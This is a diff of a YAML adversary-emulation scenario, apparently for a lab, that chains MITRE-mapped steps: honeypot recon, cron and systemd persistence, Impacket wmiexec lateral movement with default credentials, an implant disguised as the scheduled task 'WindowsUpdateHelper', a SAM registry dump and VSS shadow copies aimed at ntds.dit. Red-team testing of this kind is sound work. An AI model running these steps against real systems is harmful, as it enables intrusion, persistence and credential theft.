@@ -1,65 +1,81 @@
-id: full-attack-chain-v2
-name: "Full Attack Scenario — Honeypot to Windows Credential Access"
-description: "Complete Phase A+B — runs on linux_pivot session"
-mitre_tactics: [discovery, persistence, lateral-movement, execution, credential-access]
-tags: [linux, windows, wmiexec, lateral-movement, phase-a, phase-b]
+name: Full Attack Scenario — Honeypot to Windows Credential Access
+description: Complete Phase A+B — runs on linux_pivot session
+tags:
+  - linux
+  - windows
+  - wmiexec
+  - lateral-movement
+  - phase-a
+  - phase-b
+mitre_tactics:
+  - discovery
+  - persistence
+  - lateral-movement
+  - execution
+  - credential-access
 steps:
   - id: honeypot_recon
-    name: "Honeypot recon — confirm fake camera (T1046)"
+    name: Honeypot recon — confirm fake camera (T1046)
     action:
       type: command
       command:
         interpreter: bash
-        cmd: |
-          curl -s -o /dev/null -w "honeypot_status:%{http_code}" http://192.168.56.10:8080/ 2>/dev/null && echo " camera_found:true" || echo "honeypot_status:0"
+        cmd: >
+          curl -s -o /dev/null -w "honeypot_status:%{http_code}" http://192.168.56.10:8080/ 2>/dev/null && echo "
+          camera_found:true" || echo "honeypot_status:0"
     output_var: honeypot_status
-    timeout: "10s"
+    timeout: 10s
     on_fail: continue
   - id: linux_sysinfo
-    name: "Linux host discovery (T1082)"
-    depends_on: [honeypot_recon]
+    name: Linux host discovery (T1082)
+    depends_on:
+      - honeypot_recon
     action:
       type: atomic
       atomic_ref:
         id: T1082
         test: 2
     output_var: linux_sysinfo_out
-    timeout: "30s"
+    timeout: 30s
     on_fail: continue
   - id: linux_network
-    name: "Linux network discovery (T1016)"
-    depends_on: [linux_sysinfo]
+    name: Linux network discovery (T1016)
+    depends_on:
+      - linux_sysinfo
     action:
       type: atomic
       atomic_ref:
         id: T1016
         test: 2
     output_var: linux_network_out
-    timeout: "30s"
+    timeout: 30s
     on_fail: continue
   - id: cron_persistence
-    name: "Cron persistence (T1053.003)"
-    depends_on: [linux_sysinfo]
+    name: Cron persistence (T1053.003)
+    depends_on:
+      - linux_sysinfo
     action:
       type: atomic
       atomic_ref:
         id: T1053.003
         test: 2
-    timeout: "30s"
+    timeout: 30s
     on_fail: continue
   - id: systemd_persistence
-    name: "Systemd persistence (T1543.002)"
-    depends_on: [cron_persistence]
+    name: Systemd persistence (T1543.002)
+    depends_on:
+      - cron_persistence
     action:
       type: atomic
       atomic_ref:
         id: T1543.002
         test: 0
-    timeout: "30s"
+    timeout: 30s
     on_fail: continue
   - id: find_windows_host
-    name: "Scan internal net for Windows SMB port 445"
-    depends_on: [linux_network]
+    name: Scan internal net for Windows SMB port 445
+    depends_on:
+      - linux_network
     action:
       type: command
       command:
@@ -101,13 +117,14 @@ steps:
     output_var: windows_host_out
     output_extract:
       - var: win_ip
-        regex: "WINDOWS_HOST_FOUND: ([0-9.]+)"
+        regex: 'WINDOWS_HOST_FOUND: ([0-9.]+)'
         group: 1
-    timeout: "15s"
+    timeout: 15s
     on_fail: continue
   - id: lateral_recon
-    name: "Lateral movement — wmiexec hostname (T1021)"
-    depends_on: [find_windows_host]
+    name: Lateral movement — wmiexec hostname (T1021)
+    depends_on:
+      - find_windows_host
     action:
       type: command
       command:
@@ -127,11 +144,12 @@ steps:
           echo "---"
           echo "[+] LATERAL_MOVEMENT_SUCCESS: Achieved code execution on Windows host via WMI"
     output_var: win_hostname
-    timeout: "120s"
+    timeout: 120s
     on_fail: continue
   - id: win_sysinfo
-    name: "Windows sysinfo via wmiexec (T1082)"
-    depends_on: [lateral_recon]
+    name: Windows sysinfo via wmiexec (T1082)
+    depends_on:
+      - lateral_recon
     action:
       type: command
       command:
@@ -141,11 +159,12 @@ steps:
             'vagrant:vagrant@172.16.1.20' "hostname" 2>&1 \
             | grep -v "^\[" | grep -v "^Impacket" | grep -v "^$" | head -2
     output_var: win_sysinfo_out
-    timeout: "120s"
+    timeout: 120s
     on_fail: continue
   - id: deploy_implant
-    name: "Deploy Windows implant via wmiexec (scheduled task trigger)"
-    depends_on: [lateral_recon]
+    name: Deploy Windows implant via wmiexec (scheduled task trigger)
+    depends_on:
+      - lateral_recon
     action:
       type: command
       command:
@@ -163,13 +182,12 @@ steps:
             "schtasks /run /tn WindowsUpdateHelper" \
             2>&1 | grep -v "^\[" | grep -v "^Impacket" | grep -v "^$" | head -3
     output_var: implant_out
-    timeout: "90s"
+    timeout: 90s
     on_fail: continue
   - id: sam_dump
-    name: "SAM registry dump via wmiexec (T1003.002)"
-    depends_on: [lateral_recon]
-    timeout: "120s"
-    on_fail: continue_no_err
+    name: SAM registry dump via wmiexec (T1003.002)
+    depends_on:
+      - lateral_recon
     action:
       type: command
       command:
@@ -182,50 +200,12 @@ steps:
             2>&1 | grep -v "^\[" | grep -v "^Impacket" | grep -v "^$" | head -3
           echo "SAM_DUMP_TRIGGERED"
     output_var: sam_dump_out
-
-  # ── Step 9: AD host discovery (requires DC VM — Phase C) ─────────────────
-  # NOTE: AD Domain Controller (Windows Server) not provisioned due to RAM/disk
-  # constraints on the demo host. In production: vagrant up dc → domain join
-  # win_target → reach DC at 172.16.1.5 via pivot.
-  # - id: reach_ad_host
-  #   name: "Reach AD Domain Controller (T1018)"
-  #   depends_on: [deploy_implant]
-  #   action:
-  #     type: command
-  #     command:
-  #       interpreter: bash
-  #       cmd: |
-  #         python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
-  #           'vagrant:vagrant@172.16.1.20' \
-  #           "nltest /dsgetdc:range.local" 2>&1 | head -5
-  #   timeout: "60s"
-  #   on_fail: continue_no_err
-
-  # ── Step 10: Shadow copy → credential dump (T1003.003) ───────────────────
-  # PROVEN on win_target (standalone workstation):
-  #   VSS created: ShadowID {03E86E1B-EBE5-4569-87FA-DDECC440AF94} ReturnValue:0
-  #   SAMDump scheduled task: "SUCCESS: Attempted to run the scheduled task"
-  # On DC: same technique → ntds.dit dump → secretsdump → domain hashes
-  # - id: shadow_copy_ntds
-  #   name: "Shadow copy → ntds.dit dump (T1003.003)"
-  #   depends_on: [reach_ad_host]
-  #   action:
-  #     type: command
-  #     command:
-  #       interpreter: bash
-  #       cmd: |
-  #         # On DC: vssadmin + copy ntds.dit + secretsdump
-  #         python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
-  #           'vagrant:vagrant@172.16.1.5' \
-  #           "powershell -c \"(Get-WmiObject -List Win32_ShadowCopy).Create('C:\\','ClientAccessible')\"" \
-  #           2>&1 | grep -iE "Return|Shadow" | head -3
-  #   timeout: "120s"
-  #   on_fail: continue_no_err
-
-  # ── Step 9: Internal scan — find DC candidate ─────────────────────────────
+    timeout: 120s
+    on_fail: continue_no_err
   - id: find_dc_candidate
-    name: "Scan for AD/DC host — Kerberos(88) LDAP(389) SMB(445) (T1046)"
-    depends_on: [deploy_implant]
+    name: Scan for AD/DC host — Kerberos(88) LDAP(389) SMB(445) (T1046)
+    depends_on:
+      - deploy_implant
     action:
       type: command
       command:
@@ -240,13 +220,12 @@ steps:
           done
           exit 0
     output_var: dc_scan_out
-    timeout: "30s"
+    timeout: 30s
     on_fail: continue_no_err
-
-  # ── Step 10: VSS shadow copy — credential access POC (T1003.003) ──────────
   - id: shadow_copy_vss
-    name: "VSS shadow copy creation — credential access POC (T1003.003)"
-    depends_on: [find_dc_candidate]
+    name: VSS shadow copy creation — credential access POC (T1003.003)
+    depends_on:
+      - find_dc_candidate
     action:
       type: command
       command:
@@ -259,5 +238,5 @@ steps:
             2>&1 | grep -v "^\[" | grep -v "^Impacket" | grep -v "^$" | head -3
           echo "VSS_POC_COMPLETE"
     output_var: vss_out
-    timeout: "60s"
+    timeout: 60s
     on_fail: continue_no_err
